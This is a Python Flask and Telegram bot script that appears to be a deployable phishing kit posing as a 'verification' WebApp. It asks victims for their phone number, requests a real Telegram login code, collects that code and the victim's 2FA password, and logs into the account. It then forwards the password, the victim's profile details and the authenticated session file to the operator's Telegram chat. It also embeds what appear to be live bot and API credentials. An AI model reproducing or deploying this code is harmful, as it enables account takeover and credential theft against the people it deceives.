import os
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from flask import Flask, render_template, request, jsonify
import asyncio
from datetime import datetime, timedelta
import re
import time
import threading
import requests
import uuid
import json
import hashlib
import hmac

# Initialize Flask
app = Flask(__name__)

# Configuration (Set these in Render environment variables)
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA')
USER_ID = int(os.environ.get('USER_ID', '5425526761'))
API_ID = int(os.environ.get('API_ID', '25240346'))
API_HASH = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
WEBHOOK_URL = os.environ.get('WEBHOOK_URL', '')
SECRET_TOKEN = hashlib.sha256(BOT_TOKEN.encode()).hexdigest()[:32]

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Storage
sessions = {}
session_expiry = 300  # 5 minutes
telegram_clients = {}

# Create directories
os.makedirs('sessions', exist_ok=True)

# ==================== HELPER FUNCTIONS ====================
def generate_session_id():
    return str(uuid.uuid4())

def clean_phone(phone):
    return re.sub(r'[^\d+]', '', phone)

def generate_session_file(phone):
    safe_phone = clean_phone(phone)
    timestamp = int(time.time())
    return f"sessions/{safe_phone}_{timestamp}.session"

def clean_otp(otp):
    cleaned = re.sub(r'\D', '', otp)
    return cleaned if len(cleaned) == 5 else None

def get_client(session_file):
    if session_file not in telegram_clients:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        client = TelegramClient(
            session_file,
            API_ID,
            API_HASH,
            loop=loop,
            timeout=15
        )
        telegram_clients[session_file] = {
            'client': client,
            'loop': loop,
            'created': time.time()
        }
    return telegram_clients[session_file]

async def send_otp_async(client, phone):
    try:
        await client.connect()
        result = await client.send_code_request(phone)
        return {
            'success': True,
            'phone_code_hash': result.phone_code_hash
        }
    except Exception as e:
        error_msg = str(e)
        if "PHONE_NUMBER_INVALID" in error_msg:
            return {'success': False, 'error': 'Invalid phone number'}
        elif "PHONE_NUMBER_BANNED" in error_msg:
            return {'success': False, 'error': 'Phone number banned'}
        elif "FLOOD_WAIT" in error_msg:
            return {'success': False, 'error': 'Too many requests. Wait and try again.'}
        else:
            return {'success': False, 'error': f'Failed to send OTP: {error_msg}'}

async def verify_otp_async(client, phone, code, phone_code_hash):
    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        
        if await client.is_user_authorized():
            me = await client.get_me()
            return {
                'success': True,
                'requires_2fa': False,
                'user': {
                    'id': me.id,
                    'username': me.username,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'phone': phone
                }
            }
        else:
            return {'success': True, 'requires_2fa': True}
            
    except SessionPasswordNeededError:
        return {'success': True, 'requires_2fa': True}
    except PhoneCodeExpiredError:
        return {'success': False, 'error': 'OTP expired', 'code_expired': True}
    except PhoneCodeInvalidError:
        return {'success': False, 'error': 'Invalid OTP code'}
    except Exception as e:
        error_str = str(e).lower()
        if 'password' in error_str or '2fa' in error_str:
            return {'success': True, 'requires_2fa': True}
        return {'success': False, 'error': f'Verification failed: {str(e)}'}

async def verify_2fa_async(client, password):
    try:
        await client.sign_in(password=password)
        me = await client.get_me()
        return {
            'success': True,
            'user': {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': me.phone
            }
        }
    except Exception as e:
        return {'success': False, 'error': f'Wrong password: {str(e)}'}

def send_to_admin(phone, user_info=None, password=None):
    try:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        msg = f"""📱 <b>NEW WEBAPP VERIFICATION</b>

📞 Phone: {phone}
⏰ Time: {timestamp}
🌐 Source: WebApp (requestContact)"""
        
        if user_info:
            full_name = f"{user_info.get('first_name', '')} {user_info.get('last_name', '')}".strip()
            if full_name:
                msg += f"\n👤 Name: {full_name}"
            if user_info.get('username'):
                msg += f"\n🔗 Username: @{user_info.get('username')}"
            msg += f"\n🆔 ID: {user_info.get('id', 'N/A')}"
        
        if password:
            msg += f"\n🔐 2FA Password: <code>{password}</code>"
        
        msg += f"\n\n✅ <b>VERIFICATION SUCCESSFUL</b>"
        
        bot.send_message(USER_ID, msg, parse_mode='HTML')
        return True
    except Exception as e:
        print(f"Admin notification error: {e}")
        return False

def cleanup_sessions():
    current_time = datetime.now()
    expired = []
    for session_id, session in sessions.items():
        if session['expiry'] < current_time:
            expired.append(session_id)
    for session_id in expired:
        del sessions[session_id]

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/process-contact', methods=['POST'])
def process_contact():
    try:
        data = request.json
        phone = data.get('phone', '').strip()
        
        if not phone:
            return jsonify({'success': False, 'error': 'No phone number provided'})
        
        # Format phone number
        if not phone.startswith('+'):
            phone = '+' + phone
        
        # Validate phone number
        if len(phone) < 8 or not re.match(r'^\+\d+$', phone):
            return jsonify({'success': False, 'error': 'Invalid phone number format'})
        
        session_id = generate_session_id()
        session_file = generate_session_file(phone)
        
        # Get Telegram client
        client_data = get_client(session_file)
        client = client_data['client']
        loop = client_data['loop']
        
        # Send OTP
        result = loop.run_until_complete(send_otp_async(client, phone))
        
        if result['success']:
            sessions[session_id] = {
                'phone': phone,
                'phone_code_hash': result['phone_code_hash'],
                'session_file': session_file,
                'expiry': datetime.now() + timedelta(seconds=session_expiry),
                'attempts': 0,
                'created': datetime.now()
            }
            
            # Send initial notification to admin
            try:
                bot.send_message(
                    USER_ID,
                    f"📲 <b>WebApp Contact Received</b>\n\n📱 {phone}\n⏰ {datetime.now().strftime('%H:%M:%S')}\n🆔 Session: {session_id[:8]}...",
                    parse_mode='HTML'
                )
            except:
                pass
            
            return jsonify({
                'success': True,
                'session_id': session_id,
                'message': 'OTP sent successfully'
            })
        else:
            return jsonify({'success': False, 'error': result.get('error', 'Failed to send OTP')})
            
    except Exception as e:
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'})

@app.route('/api/verify-otp', methods=['POST'])
def verify_otp():
    try:
        data = request.json
        session_id = data.get('session_id')
        otp = data.get('otp', '')
        
        if session_id not in sessions:
            return jsonify({'success': False, 'error': 'Session expired. Please start again.'})
        
        session = sessions[session_id]
        
        # Clean OTP
        cleaned_otp = clean_otp(otp)
        if not cleaned_otp:
            return jsonify({'success': False, 'error': 'Invalid OTP format. Enter 5 digits.'})
        
        # Check attempts
        session['attempts'] += 1
        if session['attempts'] > 3:
            del sessions[session_id]
            return jsonify({'success': False, 'error': 'Too many attempts. Please start again.'})
        
        # Verify OTP
        client_data = get_client(session['session_file'])
        client = client_data['client']
        loop = client_data['loop']
        
        result = loop.run_until_complete(verify_otp_async(
            client,
            session['phone'],
            cleaned_otp,
            session['phone_code_hash']
        ))
        
        if result['success']:
            if result.get('requires_2fa'):
                session['expiry'] = datetime.now() + timedelta(seconds=600)
                return jsonify({
                    'success': True,
                    'requires_2fa': True,
                    'message': '2FA authentication required'
                })
            else:
                # Success - send session to admin
                send_to_admin(session['phone'], result.get('user'))
                
                # Send session file if exists
                if os.path.exists(session['session_file']):
                    try:
                        with open(session['session_file'], 'rb') as f:
                            bot.send_document(
                                USER_ID,
                                f,
                                caption=f"✅ Session for {session['phone']}\n⏰ {datetime.now().strftime('%H:%M:%S')}"
                            )
                    except:
                        pass
                
                del sessions[session_id]
                return jsonify({
                    'success': True,
                    'requires_2fa': False,
                    'message': 'Account verified successfully'
                })
        else:
            if result.get('code_expired'):
                del sessions[session_id]
                return jsonify({'success': False, 'error': 'OTP expired. Please start again.'})
            return jsonify({'success': False, 'error': result.get('error', 'Verification failed')})
            
    except Exception as e:
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'})

@app.route('/api/verify-2fa', methods=['POST'])
def verify_2fa():
    try:
        data = request.json
        session_id = data.get('session_id')
        password = data.get('password', '').strip()
        
        if session_id not in sessions:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        if not password:
            return jsonify({'success': False, 'error': 'Please enter 2FA password'})
        
        session = sessions[session_id]
        client_data = get_client(session['session_file'])
        client = client_data['client']
        loop = client_data['loop']
        
        result = loop.run_until_complete(verify_2fa_async(client, password))
        
        if result['success']:
            # Success with 2FA
            send_to_admin(session['phone'], result.get('user'), password)
            
            # Send session file
            if os.path.exists(session['session_file']):
                try:
                    with open(session['session_file'], 'rb') as f:
                        bot.send_document(
                            USER_ID,
                            f,
                            caption=f"✅ 2FA Session for {session['phone']}\n⏰ {datetime.now().strftime('%H:%M:%S')}"
                        )
                except:
                    pass
            
            del sessions[session_id]
            return jsonify({'success': True, 'message': '2FA verified successfully'})
        else:
            return jsonify({'success': False, 'error': result.get('error', '2FA verification failed')})
            
    except Exception as e:
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'})

@app.route('/api/complete', methods=['POST'])
def complete():
    try:
        data = request.json
        phone = data.get('phone', 'Unknown')
        
        # Final success notification
        bot.send_message(
            USER_ID,
            f"🎉 <b>VERIFICATION COMPLETE</b>\n\n📱 {phone}\n⏰ {datetime.now().strftime('%H:%M:%S')}\n✅ User has completed verification",
            parse_mode='HTML'
        )
        
        return jsonify({'success': True, 'message': 'Verification completed'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ==================== BOT HANDLER ====================
@bot.message_handler(commands=['start'])
def start_command(message):
    """Send WebApp button"""
    try:
        # Get WebApp URL
        webapp_url = WEBHOOK_URL.rstrip('/') if WEBHOOK_URL else f"https://{request.host}"
        
        keyboard = types.InlineKeyboardMarkup()
        webapp_btn = types.InlineKeyboardButton(
            text="🔐 Open Verification WebApp",
            web_app=types.WebAppInfo(url=f"{webapp_url}/")
        )
        keyboard.add(webapp_btn)
        
        # Send WebApp button (this message stays in chat)
        bot.send_message(
            message.chat.id,
            "Click below to start verification:",
            reply_markup=keyboard
        )
        
    except Exception as e:
        print(f"Start command error: {e}")

# ==================== WEBHOOK SETUP ====================
def setup_webhook():
    """Set up webhook for Render"""
    try:
        if WEBHOOK_URL:
            bot.remove_webhook()
            time.sleep(1)
            webhook_url = f"{WEBHOOK_URL.rstrip('/')}/bot/{BOT_TOKEN}"
            bot.set_webhook(url=webhook_url)
            print(f"✅ Webhook set: {webhook_url}")
            return True
        else:
            print("⚠️ No WEBHOOK_URL set, using polling")
            return False
    except Exception as e:
        print(f"❌ Webhook error: {e}")
        return False

@app.route(f'/bot/{BOT_TOKEN}', methods=['POST'])
def webhook():
    """Handle Telegram webhook"""
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    return 'OK', 403

# ==================== CLEANUP THREAD ====================
def cleanup_loop():
    """Clean up old sessions and clients"""
    while True:
        time.sleep(60)
        
        # Clean expired sessions
        cleanup_sessions()
        
        # Clean old clients
        current_time = time.time()
        to_remove = []
        for session_file, client_data in telegram_clients.items():
            if current_time - client_data['created'] > 1800:  # 30 minutes
                try:
                    loop = client_data['loop']
                    client = client_data['client']
                    loop.run_until_complete(client.disconnect())
                    loop.close()
                except:
                    pass
                to_remove.append(session_file)
        
        for session_file in to_remove:
            del telegram_clients[session_file]

# ==================== MAIN ====================
if __name__ == '__main__':
    print("="*60)
    print("🚀 Telegram WebApp Verification Bot")
    print("="*60)
    print(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
    print(f"👤 User ID: {USER_ID}")
    print(f"🔧 API ID: {API_ID}")
    
    # Start cleanup thread
    threading.Thread(target=cleanup_loop, daemon=True).start()
    
    # Set up webhook or polling
    port = int(os.environ.get('PORT', 5000))
    
    if WEBHOOK_URL and port == 10000:  # Render uses port 10000
        setup_webhook()
        print(f"🌐 WebApp URL: {WEBHOOK_URL}")
        print("🤖 Bot running via webhook")
        app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
    else:
        print("🌐 Local development mode")
        print(f"📱 WebApp URL: http://localhost:{port}")
        print("🤖 Bot running via polling")
        
        # Start bot in separate thread
        def run_bot():
            try:
                bot.polling(none_stop=True, timeout=20, skip_pending=True)
            except Exception as e:
                print(f"Bot error: {e}")
                time.sleep(5)
                run_bot()
        
        bot_thread = threading.Thread(target=run_bot, daemon=True)
        bot_thread.start()
        
        # Run Flask
        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False, threaded=True)
